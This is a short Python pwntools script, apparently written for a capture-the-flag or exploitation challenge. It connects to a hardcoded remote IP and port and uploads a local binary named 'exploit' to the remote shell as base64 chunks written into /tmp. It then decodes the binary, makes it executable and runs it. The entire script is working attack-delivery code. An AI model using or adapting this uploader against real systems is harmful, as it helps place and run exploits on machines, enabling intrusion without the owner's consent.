from pwn import *
import time, base64, os

def run(cmd): io.sendlineafter(b"$ ", cmd.encode()) ; io.recvline()

payload = base64.b64encode(open("exploit", "rb").read()).decode()

io = remote("65.109.201.160", 13371)

run('cd /tmp')
for i in range(0, len(payload), 512):
    log.info(f"{i:x} / {len(payload):x}")
    run('echo "{}" >> b64exp'.format(payload[i:i+512]))

run('base64 -d b64exp > exploit')
run('rm b64exp')
run('chmod +x exploit')
run('./exploit')

io.recvline()
log.info(io.recvline())
